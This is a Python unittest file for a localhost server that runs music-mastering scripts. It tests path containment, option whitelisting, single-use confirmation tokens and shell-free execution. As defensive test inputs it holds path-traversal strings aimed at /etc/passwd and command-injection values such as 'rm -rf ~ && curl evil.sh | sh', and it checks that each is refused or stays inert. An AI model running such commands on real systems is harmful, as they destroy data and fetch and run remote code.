#!/usr/bin/env python3
"""Tests for serve.py.

This is the one file that turns a browser click into a process, so
the tests are mostly about what it refuses. Each case below corresponds to a way
the page could otherwise reach something it should not: a path outside the root,
a flag the command table does not list, a write without a confirmation, a
confirmation reused or swapped onto a different command.

No test starts a listening socket. The handler tests below drive
BaseHTTPRequestHandler over two BytesIO buffers instead, and the one test about
binding only checks that it is refused before any socket is created.
"""

from __future__ import annotations

import dataclasses
import io
import json
import subprocess
import tempfile
import unittest
import unittest.mock
from pathlib import Path

from music_studio.serve import http as serve


# The tooling directory, one level up from tests/ — this is the root the server
# is pointed at and where the scripts it names actually live.
ROOT = Path(__file__).resolve().parent.parent


class TestPathContainment(unittest.TestCase):
    def test_relative_inside_root_is_allowed(self):
        argv = serve.build_argv("scope", {"--in": "studio/index.html"}, ROOT)
        self.assertTrue(argv[-1].startswith(str(ROOT)))

    def test_dotdot_escape_is_refused(self):
        with self.assertRaises(serve.ServeError) as c:
            serve.build_argv("scope", {"--in": "../../../../etc/passwd"}, ROOT)
        self.assertIn("escapes the root", str(c.exception))

    def test_absolute_outside_root_is_refused(self):
        with self.assertRaises(serve.ServeError):
            serve.build_argv("scope", {"--in": "/etc/passwd"}, ROOT)

    def test_symlink_style_traversal_is_refused(self):
        with self.assertRaises(serve.ServeError):
            serve.build_argv("scope", {"--in": "studio/../../../../tmp/x"}, ROOT)


class TestOptionWhitelist(unittest.TestCase):
    def test_unknown_option_is_refused(self):
        with self.assertRaises(serve.ServeError) as c:
            serve.build_argv("scope", {"--exec": "anything"}, ROOT)
        self.assertIn("does not accept", str(c.exception))

    def test_unknown_command_is_refused(self):
        with self.assertRaises(serve.ServeError):
            serve.build_argv("shell", {}, ROOT)

    def test_option_valid_for_another_command_is_still_refused(self):
        """--eq belongs to master, not to compare."""
        with self.assertRaises(serve.ServeError):
            serve.build_argv("compare", {"--eq": "warm"}, ROOT)

    def test_number_option_rejects_non_numbers(self):
        with self.assertRaises(serve.ServeError) as c:
            serve.build_argv("master", {"--lufs": "-14; whoami"}, ROOT)
        self.assertIn("expects a number", str(c.exception))

    def test_overlong_text_is_refused(self):
        with self.assertRaises(serve.ServeError):
            serve.build_argv("master", {"--eq": "x" * (serve.MAX_TEXT + 1)}, ROOT)


class TestOptionValues(unittest.TestCase):
    """How a value becomes (or does not become) an argv element."""

    def test_a_truthy_flag_appears_alone(self):
        """A flag takes no value; emitting `--measure true` would hand
        master.py a positional it does not accept."""
        argv = serve.build_argv("measure", {"--in": "README.md", "--measure": True},
                                ROOT)
        self.assertIn("--measure", argv)
        self.assertNotIn("true", argv)
        self.assertNotIn("True", argv)

    def test_a_falsy_flag_is_dropped_entirely(self):
        """The page sends every control it has, checked or not. A false
        checkbox that still emitted its flag would turn `master` into a
        measure-only run — or the reverse."""
        argv = serve.build_argv("measure", {"--in": "README.md", "--measure": False},
                                ROOT)
        self.assertNotIn("--measure", argv)

    def test_an_empty_value_is_omitted_rather_than_passed_as_blank(self):
        """An untouched text box posts "". `--eq ""` is not the same as no
        --eq: it reaches _eq_chain as an unknown preset."""
        argv = serve.build_argv("master", {"--in": "a.wav", "--eq": ""}, ROOT)
        self.assertNotIn("--eq", argv)

    def test_a_null_value_is_omitted_too(self):
        argv = serve.build_argv("master", {"--in": "a.wav", "--lufs": None}, ROOT)
        self.assertNotIn("--lufs", argv)

    def test_an_integer_keeps_its_integer_form(self):
        """`--sample-rate 48000.0` is not what ffmpeg wants."""
        argv = serve.build_argv("master", {"--sample-rate": 48000}, ROOT)
        self.assertEqual(argv[-1], "48000")

    def test_a_decimal_survives_as_a_decimal(self):
        argv = serve.build_argv("master", {"--lufs": "-14.5"}, ROOT)
        self.assertEqual(argv[-1], "-14.5")


class TestNoShell(unittest.TestCase):
    """Metacharacters are inert because no shell is ever constructed."""

    def test_metacharacters_stay_one_argv_element(self):
        argv = serve.build_argv("master", {"--eq": "highpass=f=28; rm -rf ~"}, ROOT)
        self.assertEqual(argv[-1], "highpass=f=28; rm -rf ~")
        self.assertEqual(argv[-2], "--eq")

    def test_argv_starts_with_interpreter_and_script(self):
        argv = serve.build_argv("scope", {"--in": "studio/index.html"}, ROOT)
        self.assertTrue(argv[1].endswith("analyze.py"))


class TestConfirmations(unittest.TestCase):
    def setUp(self):
        self.c = serve.Confirmations()

    def test_token_redeems_once(self):
        argv = ["a", "b"]
        tok = self.c.issue(argv)
        self.c.redeem(tok, argv)                 # first use is fine
        with self.assertRaises(serve.ServeError):
            self.c.redeem(tok, argv)             # replay is not

    def test_token_is_bound_to_its_command(self):
        """A token issued for one command must not run a different one."""
        tok = self.c.issue(["python", "master.py", "--lufs", "-16"])
        with self.assertRaises(serve.ServeError) as c:
            self.c.redeem(tok, ["python", "master.py", "--lufs", "-6"])
        self.assertIn("does not match", str(c.exception))

    def test_unknown_token_is_refused(self):
        with self.assertRaises(serve.ServeError):
            self.c.redeem("never-issued", ["a"])

    def test_expired_token_is_refused(self):
        original = serve.TOKEN_TTL
        try:
            serve.TOKEN_TTL = -1                 # everything is already stale
            tok = self.c.issue(["a"])
            with self.assertRaises(serve.ServeError):
                self.c.redeem(tok, ["a"])
        finally:
            serve.TOKEN_TTL = original


class TestWriteClassification(unittest.TestCase):
    """Whether a command writes decides whether it needs confirming, so the
    table must not drift."""

    def test_master_writes(self):
        self.assertTrue(serve.COMMANDS["master"].writes)

    def test_analysis_commands_do_not_write(self):
        for name in ("scope", "measure", "compare", "advise"):
            self.assertFalse(serve.COMMANDS[name].writes, f"{name} marked as writing")

    def test_every_command_names_a_script_that_exists(self):
        """Resolved through paths.script(), which is what the server uses.

        Checking `ROOT / cmd.script` instead would be a second guess at where
        the file is, and it would agree with the server only by coincidence —
        it stopped agreeing the moment these modules moved into sub-packages.
        """
        from music_studio import paths
        for name, cmd in serve.COMMANDS.items():
            self.assertTrue(paths.script(cmd.script).is_file(),
                            f"{name} points at missing {cmd.script}")


class TestBinding(unittest.TestCase):
    def test_refuses_non_loopback(self):
        for host in ("0.0.0.0", "192.168.1.10", "::"):
            with self.assertRaises(serve.ServeError) as c:
                serve.serve(ROOT, 0, False, host)
            self.assertIn("loopback", str(c.exception))

    def test_refuses_a_root_that_is_not_a_directory(self):
        with self.assertRaises(serve.ServeError):
            serve.serve(ROOT / "serve.py", 0, False, "127.0.0.1")

    def test_refuses_to_start_without_the_studio_page(self):
        """Checked at startup rather than on the first GET: a packaging
        mistake that moved web/ should fail loudly when you run the command,
        not as a 404 in the browser ten minutes later."""
        with unittest.mock.patch.object(serve, "STUDIO", ROOT / "no-such-web"):
            with self.assertRaises(serve.ServeError) as c:
                serve.serve(ROOT, 0, False, "127.0.0.1")
        self.assertIn("no studio page", str(c.exception))


# --------------------------------------------------------------------------
# the request handler
#
# BaseHTTPRequestHandler parses a request off a file object and writes the
# reply to another, so the whole handler can be exercised with two BytesIO
# buffers and no socket at all. That matters here: the alternative is starting
# a real listener in every routing test, and this file's whole claim is that
# it never opens one.
# --------------------------------------------------------------------------

class _FakeSocket:
    """Enough of a socket for BaseHTTPRequestHandler's constructor."""

    def __init__(self, data: bytes):
        self._r = io.BytesIO(data)
        self.sent = io.BytesIO()

    def makefile(self, mode="r", *a, **kw):
        return self._r if "r" in mode else self.sent

    def sendall(self, data):
        self.sent.write(data)

    def close(self):
        pass


@dataclasses.dataclass
class _Reply:
    status: int
    headers: dict
    body: bytes

    def json(self):
        return json.loads(self.body.decode("utf-8"))


def _request(raw: bytes, root: Path, read_only: bool = False,
             confirmations=None) -> _Reply:
    """Feed one raw HTTP request to Handler and parse what it wrote back."""
    serve.Handler.root = root.resolve()
    serve.Handler.read_only = read_only
    serve.Handler.confirmations = confirmations or serve.Confirmations()

    sock = _FakeSocket(raw)
    # __init__ does the whole request/response cycle; nothing to call after.
    serve.Handler(sock, ("127.0.0.1", 5555), None)

    out = sock.sent.getvalue()
    head, _, body = out.partition(b"\r\n\r\n")
    lines = head.decode("latin-1").split("\r\n")
    status = int(lines[0].split()[1])
    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()
    return _Reply(status, headers, body)


def _get(path: str, root: Path, **kw) -> _Reply:
    return _request(f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode(),
                    root, **kw)


def _post(path: str, payload, root: Path, origin: str | None = None, **kw) -> _Reply:
    body = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    head = [f"POST {path} HTTP/1.1", "Host: 127.0.0.1",
            f"Content-Length: {len(body)}", "Content-Type: application/json"]
    if origin:
        head.append(f"Origin: {origin}")
    return _request(("\r\n".join(head) + "\r\n\r\n").encode() + body, root, **kw)


class TestHealth(unittest.TestCase):
    """The page builds its entire UI from this response, so a field going
    missing here is a blank panel rather than an error anyone would notice."""

    def test_health_reports_the_root_and_mode(self):
        r = _get("/api/health", ROOT, read_only=True)
        self.assertEqual(r.status, 200)
        self.assertTrue(r.json()["ok"])
        self.assertEqual(r.json()["root"], str(ROOT))
        self.assertTrue(r.json()["read_only"])

    def test_health_publishes_the_whole_command_table(self):
        got = _get("/api/health", ROOT).json()["commands"]
        self.assertEqual(set(got), set(serve.COMMANDS))
        for name, spec in got.items():
            self.assertEqual(spec["writes"], serve.COMMANDS[name].writes, name)
            self.assertEqual(spec["options"], serve.COMMANDS[name].options, name)

    def test_health_never_leaks_the_interpreter_path(self):
        """The table describes commands, not how they are launched. PYTHON is
        an absolute path into a virtualenv and has no business on the wire."""
        self.assertNotIn(serve.PYTHON, _get("/api/health", ROOT).body.decode())


class TestAnalysisEndpoint(unittest.TestCase):
    """`/api/analysis` reads a file off disk on demand, so it is the one GET
    that could become a way to read the machine. Same containment rule as every
    path argument, and the name is pinned too."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name).resolve()
        self.addCleanup(self._tmp.cleanup)

    def _write(self, rel: str, text: str) -> Path:
        p = self.root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
        return p

    def test_serves_an_analysis_inside_the_root(self):
        self._write("take/analysis.json", '{"schema": "audio-analysis/v1"}')
        r = _get("/api/analysis?path=take/analysis.json", self.root)
        self.assertEqual(r.status, 200)
        self.assertEqual(r.json()["schema"], "audio-analysis/v1")

    def test_escaping_the_root_is_403_not_404(self):
        """The distinction is the point: 404 would confirm or deny the file's
        existence outside the root, which is exactly what must not leak."""
        r = _get("/api/analysis?path=../../../../etc/passwd", self.root)
        self.assertEqual(r.status, 403)
        self.assertIn("escapes the root", r.json()["error"])

    def test_an_absolute_path_outside_the_root_is_refused(self):
        r = _get("/api/analysis?path=/etc/hosts", self.root)
        self.assertEqual(r.status, 403)

    def test_only_a_file_called_analysis_json_is_served(self):
        """Containment alone would let this read any JSON — or any file — under
        the root, including a .env someone left in the track directory."""
        self._write("secrets.json", '{"key": "sk-live"}')
        r = _get("/api/analysis?path=secrets.json", self.root)
        self.assertEqual(r.status, 404)
        self.assertNotIn("sk-live", r.body.decode())

    def test_a_missing_analysis_is_404(self):
        r = _get("/api/analysis?path=nowhere/analysis.json", self.root)
        self.assertEqual(r.status, 404)

    def test_no_path_argument_is_refused_rather_than_defaulting(self):
        r = _get("/api/analysis", self.root)
        self.assertIn(r.status, (403, 404))

    def test_the_analysis_is_not_cached(self):
        """The page re-fetches after every run; a cached copy shows the
        previous master's numbers against the new file."""
        self._write("take/analysis.json", "{}")
        r = _get("/api/analysis?path=take/analysis.json", self.root)
        self.assertEqual(r.headers.get("Cache-Control"), "no-store")


class TestStaticFiles(unittest.TestCase):
    def test_root_serves_the_studio_page(self):
        r = _get("/", ROOT)
        self.assertEqual(r.status, 200)
        self.assertIn("text/html", r.headers["Content-Type"])
        self.assertIn(b"<", r.body)

    def test_index_is_reachable_by_name_too(self):
        self.assertEqual(_get("/index.html", ROOT).status, 200)

    def test_a_missing_asset_is_404(self):
        r = _get("/no-such-asset.js", ROOT)
        self.assertEqual(r.status, 404)
        self.assertEqual(r.json()["error"], "not found")

    def test_escaping_the_studio_directory_is_refused(self):
        """Static files come from the packaged web/ directory, not from --root,
        so it needs its own containment check and has one."""
        r = _get("/../../../../etc/passwd", ROOT)
        self.assertEqual(r.status, 403)
        self.assertNotIn(b"root:", r.body)

    def test_a_query_string_does_not_reach_the_filesystem(self):
        """Cache-busting suffixes are normal; `index.html?v=3` must not be
        looked up as a filename with the query still attached."""
        self.assertEqual(_get("/index.html?v=3", ROOT).status, 200)


class TestPrepare(unittest.TestCase):
    """/api/prepare is the step that shows a human what is about to run. What
    it returns is the only thing standing between a click and a rewritten
    master, so the display and the token both matter."""

    def test_a_read_command_needs_no_token(self):
        r = _post("/api/prepare",
                  {"command": "measure", "options": {"--in": "README.md"}}, ROOT)
        self.assertEqual(r.status, 200)
        self.assertIsNone(r.json()["confirm"])
        self.assertFalse(r.json()["writes"])

    def test_a_write_command_issues_a_token(self):
        r = _post("/api/prepare",
                  {"command": "master",
                   "options": {"--in": "a.wav", "--out": "b.wav"}}, ROOT)
        self.assertTrue(r.json()["writes"])
        self.assertTrue(r.json()["confirm"])

    def test_a_read_only_server_refuses_to_prepare_a_write(self):
        """Refusing at prepare rather than at run means the page can grey the
        button out instead of offering an action that will fail."""
        r = _post("/api/prepare",
                  {"command": "master",
                   "options": {"--in": "a.wav", "--out": "b.wav"}},
                  ROOT, read_only=True)
        self.assertEqual(r.status, 400)
        self.assertIn("read-only", r.json()["error"])

    def test_the_display_is_what_the_human_will_read(self):
        """It has to name the command and the file; an absolute interpreter
        path and a temp directory would make it unreadable, which is how a
        confirmation stops being one."""
        d = _post("/api/prepare",
                  {"command": "measure", "options": {"--in": "README.md"}},
                  ROOT).json()["display"]
        self.assertTrue(d.startswith("master"), d)     # master.py, --measure
        self.assertIn("README.md", d)
        self.assertNotIn(str(ROOT), d)

    def test_an_unknown_command_is_a_400(self):
        r = _post("/api/prepare", {"command": "rm", "options": {}}, ROOT)
        self.assertEqual(r.status, 400)
        self.assertIn("unknown command", r.json()["error"])

    def test_an_unknown_endpoint_is_404(self):
        r = _post("/api/nope", {"command": "measure", "options": {}}, ROOT)
        self.assertEqual(r.status, 404)


class TestRun(unittest.TestCase):
    """subprocess.run is patched throughout: these tests are about what argv is
    built and whether it is allowed to run, never about ffmpeg."""

    def setUp(self):
        self.calls = []

        def fake_run(argv, **kw):
            self.calls.append((argv, kw))
            return subprocess.CompletedProcess(argv, 0, "measured\n", "")

        patcher = unittest.mock.patch("subprocess.run", side_effect=fake_run)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_a_read_command_runs_without_a_token(self):
        r = _post("/api/run",
                  {"command": "measure", "options": {"--in": "README.md"}}, ROOT)
        self.assertEqual(r.status, 200)
        self.assertEqual(r.json()["returncode"], 0)
        self.assertIn("measured", r.json()["stdout"])

    def test_never_a_shell(self):
        """The file's central claim. A shell here would make every text option
        an injection point, and --eq carries arbitrary filter chains."""
        _post("/api/run", {"command": "measure", "options": {"--in": "README.md"}},
              ROOT)
        argv, kw = self.calls[0]
        self.assertIs(kw["shell"], False)
        self.assertIsInstance(argv, list)

    def test_metacharacters_survive_as_one_argument(self):
        """Proof the previous test's `shell=False` is load-bearing: this string
        would be four commands if it ever reached a shell."""
        self.confirm_and_run(
            {"command": "master",
             "options": {"--in": "a.wav", "--out": "b.wav",
                         "--eq": "highpass=f=28; rm -rf ~ && curl evil.sh | sh"}})
        argv = self.calls[-1][0]
        self.assertIn("highpass=f=28; rm -rf ~ && curl evil.sh | sh", argv)

    def confirm_and_run(self, body):
        """Do the two-step dance a writing command requires."""
        confirmations = serve.Confirmations()
        prep = _post("/api/prepare", body, ROOT, confirmations=confirmations)
        return _post("/api/run", {**body, "confirm": prep.json()["confirm"]},
                     ROOT, confirmations=confirmations)

    def test_a_write_runs_once_the_token_is_presented(self):
        r = self.confirm_and_run({"command": "master",
                                  "options": {"--in": "a.wav", "--out": "b.wav"}})
        self.assertEqual(r.status, 200)
        self.assertEqual(r.json()["returncode"], 0)

    def test_a_write_without_a_token_does_not_run(self):
        r = _post("/api/run",
                  {"command": "master", "options": {"--in": "a.wav", "--out": "b.wav"}},
                  ROOT)
        self.assertEqual(r.status, 400)
        self.assertEqual(self.calls, [], "the command ran anyway")

    def test_a_token_cannot_be_replayed(self):
        """Otherwise the page could re-master on a refresh, and a token lifted
        from one request would work forever."""
        confirmations = serve.Confirmations()
        body = {"command": "master",
                "options": {"--in": "a.wav", "--out": "b.wav"}}
        tok = _post("/api/prepare", body, ROOT,
                    confirmations=confirmations).json()["confirm"]
        first = _post("/api/run", {**body, "confirm": tok}, ROOT,
                      confirmations=confirmations)
        second = _post("/api/run", {**body, "confirm": tok}, ROOT,
                       confirmations=confirmations)
        self.assertEqual(first.status, 200)
        self.assertEqual(second.status, 400)
        self.assertEqual(len(self.calls), 1)

    def test_a_token_does_not_carry_to_different_arguments(self):
        """Confirm -14 LUFS, run -6: the whole point of showing the argv is
        that the shown one is the one that runs."""
        confirmations = serve.Confirmations()
        shown = {"command": "master",
                 "options": {"--in": "a.wav", "--out": "b.wav", "--lufs": -14}}
        tok = _post("/api/prepare", shown, ROOT,
                    confirmations=confirmations).json()["confirm"]
        swapped = {"command": "master",
                   "options": {"--in": "a.wav", "--out": "b.wav", "--lufs": -6},
                   "confirm": tok}
        r = _post("/api/run", swapped, ROOT, confirmations=confirmations)
        self.assertEqual(r.status, 400)
        self.assertIn("does not match", r.json()["error"])
        self.assertEqual(self.calls, [])

    def test_a_read_only_server_refuses_to_run_a_write(self):
        r = _post("/api/run",
                  {"command": "master",
                   "options": {"--in": "a.wav", "--out": "b.wav"}, "confirm": "x"},
                  ROOT, read_only=True)
        self.assertEqual(r.status, 400)
        self.assertEqual(self.calls, [])

    def test_output_is_truncated_rather_than_streamed_whole(self):
        """A runaway ffmpeg log would otherwise be megabytes of JSON into a
        browser tab."""
        with unittest.mock.patch(
                "subprocess.run",
                return_value=subprocess.CompletedProcess([], 0, "x" * 200000, "")):
            r = _post("/api/run",
                      {"command": "measure", "options": {"--in": "README.md"}}, ROOT)
        self.assertEqual(len(r.json()["stdout"]), 40000)

    def test_a_timeout_is_a_readable_error_not_a_500(self):
        with unittest.mock.patch(
                "subprocess.run",
                side_effect=subprocess.TimeoutExpired("ffmpeg", serve.RUN_TIMEOUT)):
            r = _post("/api/run",
                      {"command": "measure", "options": {"--in": "README.md"}}, ROOT)
        self.assertEqual(r.status, 400)
        self.assertIn("timed out", r.json()["error"])

    def test_an_unexpected_failure_is_a_500_with_a_type(self):
        """A crash inside a command must still answer: the page waits on this
        response and a dropped connection just hangs the UI."""
        with unittest.mock.patch("subprocess.run", side_effect=OSError("boom")):
            r = _post("/api/run",
                      {"command": "measure", "options": {"--in": "README.md"}}, ROOT)
        self.assertEqual(r.status, 500)
        self.assertIn("OSError", r.json()["error"])


class TestRequestGuards(unittest.TestCase):
    def test_a_cross_origin_post_is_refused(self):
        """A page elsewhere cannot read our replies but can still cause the
        POST, and a POST here runs a command."""
        r = _post("/api/run", {"command": "measure", "options": {}}, ROOT,
                  origin="https://evil.example")
        self.assertEqual(r.status, 400)
        self.assertIn("cross-origin", r.json()["error"])

    def test_our_own_origin_is_allowed(self):
        r = _post("/api/prepare", {"command": "measure", "options": {}}, ROOT,
                  origin="http://localhost:8770")
        self.assertEqual(r.status, 200)

    def test_a_body_that_is_not_json_is_a_400(self):
        r = _post("/api/run", b"{not json", ROOT)
        self.assertEqual(r.status, 400)
        self.assertIn("not JSON", r.json()["error"])

    def test_an_empty_body_is_refused(self):
        r = _request(b"POST /api/run HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                     b"Content-Length: 0\r\n\r\n", ROOT)
        self.assertEqual(r.status, 400)

    def test_an_oversized_body_is_refused_before_it_is_read(self):
        """The length is checked against MAX_BODY first, so a declared
        gigabyte never gets allocated."""
        r = _request(f"POST /api/run HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                     f"Content-Length: {serve.MAX_BODY + 1}\r\n\r\n".encode(), ROOT)
        self.assertEqual(r.status, 400)
        self.assertIn("oversized", r.json()["error"])

    def test_json_replies_forbid_sniffing(self):
        """An error string echoed back is attacker-influenced; a browser that
        sniffs it as HTML would run it."""
        r = _get("/api/health", ROOT)
        self.assertEqual(r.headers.get("X-Content-Type-Options"), "nosniff")


class TestDisplay(unittest.TestCase):
    """What a person reads before confirming. Tested directly because the
    confirmation is only meaningful if the display is accurate."""

    def test_paths_under_the_root_become_relative(self):
        argv = ["/py", "/x/master.py", "--in", str(ROOT / "take.wav")]
        self.assertEqual(serve._display(argv, ROOT), "master --in take.wav")

    def test_a_path_outside_the_root_keeps_its_name(self):
        """Truncating to the basename is deliberate: the full path of an
        unrelated file is noise, but losing the name entirely would hide which
        file is about to be written."""
        argv = ["/py", "/x/master.py", "--out", "/elsewhere/deep/thing.wav"]
        self.assertEqual(serve._display(argv, ROOT), "master --out thing.wav")

    def test_an_argument_with_spaces_is_quoted(self):
        """So the line can be pasted into a shell and mean the same thing."""
        argv = ["/py", "/x/master.py", "--eq", "highpass=f=28, lowpass=f=18000"]
        self.assertIn('"highpass=f=28, lowpass=f=18000"', serve._display(argv, ROOT))

    def test_the_interpreter_never_appears(self):
        argv = [serve.PYTHON, "/x/master.py", "--in", "a.wav"]
        self.assertNotIn(serve.PYTHON, serve._display(argv, ROOT))


class TestMain(unittest.TestCase):
    """The CLI wrapper. serve() is patched: starting a real server in a test
    would block, and what is under test is the argument handling."""

    def test_defaults_are_loopback_and_writable(self):
        with unittest.mock.patch.object(serve, "serve") as started:
            self.assertEqual(serve.main(["--root", str(ROOT)]), 0)
        root, port, read_only, host = started.call_args[0]
        self.assertEqual(host, "127.0.0.1")
        self.assertFalse(read_only)
        self.assertEqual(port, 8770)

    def test_read_only_reaches_the_server(self):
        with unittest.mock.patch.object(serve, "serve") as started:
            serve.main(["--root", str(ROOT), "--read-only", "--port", "9001"])
        self.assertTrue(started.call_args[0][2])
        self.assertEqual(started.call_args[0][1], 9001)

    def test_the_root_is_resolved_before_it_is_handed_over(self):
        """Containment compares resolved paths, so a relative --root that was
        never resolved would make every comparison fail open."""
        with unittest.mock.patch.object(serve, "serve") as started:
            serve.main(["--root", str(ROOT / "tests" / "..")])
        self.assertEqual(started.call_args[0][0], ROOT)

    def test_a_refusal_is_an_exit_code_not_a_traceback(self):
        self.assertEqual(serve.main(["--root", str(ROOT), "--host", "0.0.0.0"]), 1)


class TestServeStartup(unittest.TestCase):
    """serve() up to the point it would listen. ThreadingHTTPServer is patched
    so nothing binds."""

    def setUp(self):
        # serve() announces itself at INFO; that belongs on a terminal, not
        # interleaved through the test output.
        quiet = unittest.mock.patch.object(serve.log, "info")
        quiet.start()
        self.addCleanup(quiet.stop)

    def test_the_handler_is_configured_before_the_server_starts(self):
        """Handler reads root/read_only/confirmations off the class. If they
        were set after serve_forever(), the first request would hit whatever
        the previous run left there."""
        seen = {}

        class FakeServer:
            def __init__(self, addr, handler):
                seen["addr"] = addr
                seen["root"] = handler.root
                seen["read_only"] = handler.read_only
                seen["confirmations"] = handler.confirmations

            def serve_forever(self):
                pass

            def server_close(self):
                seen["closed"] = True

        with unittest.mock.patch.object(serve, "ThreadingHTTPServer", FakeServer):
            serve.serve(ROOT, 8899, True, "127.0.0.1")

        self.assertEqual(seen["addr"], ("127.0.0.1", 8899))
        self.assertEqual(seen["root"], ROOT)
        self.assertTrue(seen["read_only"])
        self.assertIsInstance(seen["confirmations"], serve.Confirmations)
        self.assertTrue(seen["closed"], "the socket was left open")

    def test_ctrl_c_closes_the_socket(self):
        """Without the finally, a restart after ^C hits 'address in use'."""
        closed = []

        class FakeServer:
            def __init__(self, addr, handler):
                pass

            def serve_forever(self):
                raise KeyboardInterrupt

            def server_close(self):
                closed.append(True)

        with unittest.mock.patch.object(serve, "ThreadingHTTPServer", FakeServer):
            serve.serve(ROOT, 0, False, "127.0.0.1")
        self.assertEqual(closed, [True])


if __name__ == "__main__":
    unittest.main()
